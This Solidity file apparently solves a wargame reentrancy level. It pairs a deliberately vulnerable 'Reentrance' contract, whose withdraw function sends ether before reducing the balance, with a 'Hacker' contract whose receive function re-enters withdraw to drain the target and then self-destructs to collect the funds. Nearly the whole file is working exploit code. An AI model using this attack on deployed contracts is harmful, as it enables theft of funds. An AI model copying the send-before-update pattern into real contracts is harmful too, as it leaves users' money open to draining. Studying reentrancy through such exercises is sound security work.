pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}

contract Hacker{

    Reentrance hackIt;
    
    constructor(address payable hackAddr) public{
        
        hackIt = Reentrance(hackAddr);
    }
    
    function hack(uint amount) public payable{
        hackIt.donate{value : msg.value}(address(this));
        hackIt.withdraw(msg.value);
    }
    
    function withdraw () public {
        selfdestruct(msg.sender);
    }
    
    //withdraws one ETH each time, can change
    receive() external payable{ 
        if (address(hackIt).balance > msg.value){
            hackIt.withdraw(msg.value);
        }
    }
}